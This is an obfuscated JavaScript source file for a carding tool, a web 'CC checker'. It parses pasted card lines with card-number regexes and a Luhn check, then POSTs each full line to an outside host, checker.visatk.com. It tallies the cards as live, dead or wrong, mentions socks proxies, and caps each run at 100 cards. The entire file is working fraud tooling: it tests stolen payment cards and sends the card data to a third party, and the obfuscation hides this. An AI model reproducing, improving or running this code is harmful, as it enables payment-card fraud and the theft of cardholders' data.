var _0x756b = ["title", "remove", "prototype", "indexOf", "splice", "disabled", "attr", "#mailpass", "Progress: ", "/", "text", ".check-amount", "floor", "%", "width", "css", ".progress .bar", "% [", "] ", "html", "#tvmit_live_count", "", "#tvmit_die_count", "#tvmit_wrong_count", "<img src='assets/img/clear.gif\'/>", "#checkStatus", "#submit", "#stop", "Done", "abort", "\x0A", "split", "val", "join", "length", "https://checker.visatk.com/ccn1/alien07.php", "json", "POST", "<img src='assets/img/loading.gif'/>", "ajax=1&do=check&cclist=", "msg", "<br />", "append", "#wrong", "Error! Contact Admin.", "Something went badly wrong!", "#badsock", "#tvmit_die", "#tvmit_live", "error", "ajax", "match", "push", "replace", "charAt", "click", "#fail", "trim", "No Cards Found!", "show", "#result", "#check-progress", "ready", "#socks"];
var ajaxCall;
var docTitle = document[_0x756b[0]];
var a = 0;
Array[_0x756b[2]][_0x756b[1]] = function (_0xa295x4) {
    var _0xa295x5 = this[_0x756b[3]](_0xa295x4);
    if (_0xa295x5 != -1) {
        this[_0x756b[4]](_0xa295x5, 1);
    };
    return this;
};

function enableTextArea(_0xa295x7) {
    $(_0x756b[7])[_0x756b[6]](_0x756b[5], _0xa295x7);
};

function updateProgress(a, _0xa295x9) {
    $(_0x756b[11])[_0x756b[10]](_0x756b[8] + a + _0x756b[9] + _0xa295x9);
    var _0xa295xa = Math[_0x756b[12]](a / _0xa295x9 * 100);
    $(_0x756b[16])[_0x756b[15]](_0x756b[14], _0xa295xa + _0x756b[13])[_0x756b[10]](_0xa295xa + _0x756b[13]);
    document[_0x756b[0]] = _0xa295xa + _0x756b[17] + a + _0x756b[9] + _0xa295x9 + _0x756b[18] + docTitle;
};

function tvmit_liveUp() {
    var _0xa295xc = parseInt($(_0x756b[20])[_0x756b[19]]());
    _0xa295xc++;
    $(_0x756b[20])[_0x756b[19]](_0xa295xc + _0x756b[21]);
};

function tvmit_dieUp() {
    var _0xa295xc = parseInt($(_0x756b[22])[_0x756b[19]]());
    _0xa295xc++;
    $(_0x756b[22])[_0x756b[19]](_0xa295xc + _0x756b[21]);
};

function tvmit_wrongUp() {
    var _0xa295xc = parseInt($(_0x756b[23])[_0x756b[19]]());
    _0xa295xc++;
    $(_0x756b[23])[_0x756b[19]](_0xa295xc + _0x756b[21]);
};

function stopLoading(_0xa295x7) {
    $(_0x756b[25])[_0x756b[19]](_0x756b[24]);
    enableTextArea(false);
    $(_0x756b[26])[_0x756b[6]](_0x756b[5], false);
    $(_0x756b[27])[_0x756b[6]](_0x756b[5], true);
    if (_0xa295x7) {
        alert(_0x756b[28]);
    } else {
        ajaxCall[_0x756b[29]]();
    };
};

function updateTextBox(_0xa295x11) {
    var _0xa295x12 = $(_0x756b[7])[_0x756b[32]]()[_0x756b[31]](_0x756b[30]);
    _0xa295x12[_0x756b[1]](_0xa295x11);
    $(_0x756b[7])[_0x756b[32]](_0xa295x12[_0x756b[33]](_0x756b[30]));
};

function OKTY(_0xa295x14, _0xa295x15, _0xa295x16, _0xa295x17) {
    if (_0xa295x14[_0x756b[34]] < 1 || _0xa295x15 >= _0xa295x14[_0x756b[34]]) {
        stopLoading(true);
        return false;
    };
    if (_0xa295x14[_0x756b[34]] > 100) {
        alert('UPS!! ONLY 100CC/CHECK!!!');
        stopLoading(true);
        return false;
    };
    if (_0xa295x17 >= _0xa295x16) {
        OKTY(_0xa295x14, _0xa295x15, _0xa295x16, 0);
        return false;
    };
    updateTextBox(_0xa295x14[_0xa295x15]);
    ajaxCall = $[_0x756b[50]]({
        url: _0x756b[35],
        dataType: _0x756b[36],
        cache: false,
        type: _0x756b[37],
        beforeSend: function (_0xa295x18) {
            $(_0x756b[25])[_0x756b[19]](_0x756b[38]);
        },
        data: _0x756b[39] + encodeURIComponent(_0xa295x14[_0xa295x15]),
        success: function (_0xa295x19) {
            switch (_0xa295x19[_0x756b[49]]) {
            case -1:
                _0xa295x15++;
                $(_0x756b[43])[_0x756b[42]](_0xa295x19[_0x756b[40]] + _0x756b[41]);
                updateProgress(_0xa295x15, _0xa295x14[_0x756b[34]]);
                tvmit_wrongUp();
                break;;
            case 1:
                ;
            case 12:
                alert(_0x756b[44]);
                throw new Error(_0x756b[45]);
                break;;
            case 3:
                $(_0x756b[46])[_0x756b[42]](_0xa295x19[_0x756b[40]]);
                updateProgress(_0xa295x15, _0xa295x14[_0x756b[34]]);
                break;;
            case 2:
                _0xa295x15++;
                $(_0x756b[47])[_0x756b[42]](_0xa295x19[_0x756b[40]] + _0x756b[41]);
                _0xa295x17++;
                updateProgress(_0xa295x15, _0xa295x14[_0x756b[34]]);
                tvmit_dieUp();
                break;;
            case 0:
                _0xa295x15++;
                $(_0x756b[48])[_0x756b[42]](_0xa295x19[_0x756b[40]] + _0x756b[41]);
                tvmit_liveUp();
                updateProgress(_0xa295x15, _0xa295x14[_0x756b[34]]);
                break;;
            };
            OKTY(_0xa295x14, _0xa295x15, _0xa295x16, _0xa295x17);
        }
    });
    return true;
};

function filterMP(a) {
    var _0xa295x1b = a[_0x756b[31]](_0x756b[30]);
    var _0xa295x1c = new Array();
    var _0xa295x14 = new Array();
    for (var _0xa295x18 = 0; _0xa295x18 < _0xa295x1b[_0x756b[34]]; _0xa295x18++) {
        if (_0xa295x1b[_0xa295x18][_0x756b[34]] > 0) {
            var _0xa295x1d = /(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14}|6(?:011|5[0-9][0-9])[0-9]{12}|3[47][0-9]{13}|3(?:0[0-5]|[68][0-9])[0-9]{11}|(?:2131|1800|35\d{3})\d{11})/g;
            var _0xa295x1e = _0xa295x1b[_0xa295x18][_0x756b[51]](_0xa295x1d);
            if (null == _0xa295x1e || !LuhnCheck(_0xa295x1e[0])) {
                continue;
            };
            if (_0xa295x1c[_0x756b[3]](_0xa295x1e[0]) == -1) {
                _0xa295x1c[_0x756b[52]](_0xa295x1e[0]);
                _0xa295x14[_0x756b[52]](_0xa295x1b[_0xa295x18]);
            };
        };
    };
    return _0xa295x14;
};
var LuhnCheck = function () {
    var a = [0, 2, 4, 6, 8, 1, 3, 5, 7, 9];
    return function (_0xa295x9) {
        var _0xa295xa = 0;
        var _0xa295x20;
        var _0xa295x18 = false;
        var _0xa295x1d = String(_0xa295x9)[_0x756b[53]](/[^\d]/g, _0x756b[21]);
        if (0 == _0xa295x1d[_0x756b[34]]) {
            return false;
        };
        for (var _0xa295x1e = _0xa295x1d[_0x756b[34]] - 1; _0xa295x1e >= 0; --_0xa295x1e) {
            _0xa295x20 = parseInt(_0xa295x1d[_0x756b[54]](_0xa295x1e), 10);
            _0xa295xa += (_0xa295x18 = !_0xa295x18) ? _0xa295x20 : a[_0xa295x20];
        };
        return _0xa295xa % 10 == 0;
    };
}();
$(document)[_0x756b[62]](function () {
    $(_0x756b[27])[_0x756b[6]](_0x756b[5], true)[_0x756b[55]](function () {
        stopLoading(false);
    });
    $(_0x756b[26])[_0x756b[55]](function () {
        var _0xa295x12 = filterMP($(_0x756b[7])[_0x756b[32]]());
        var _0xa295x16 = parseInt($(_0x756b[56])[_0x756b[32]]());
        var _0xa295x17 = 0;
        if ($(_0x756b[7])[_0x756b[32]]()[_0x756b[57]]() == _0x756b[21]) {
            alert(_0x756b[58]);
            return false;
        };

        $(_0x756b[7])[_0x756b[32]](_0xa295x12[_0x756b[33]](_0x756b[30]))[_0x756b[6]](_0x756b[5], true);
        $(_0x756b[60])[_0x756b[59]]();
        $(_0x756b[61])[_0x756b[59]]();
        $(_0x756b[26])[_0x756b[6]](_0x756b[5], true);
        $(_0x756b[27])[_0x756b[6]](_0x756b[5], false);
        updateProgress(0, _0xa295x12[_0x756b[34]]);
        OKTY(_0xa295x12, 0, _0xa295x16, 0);
        return false;
    });
});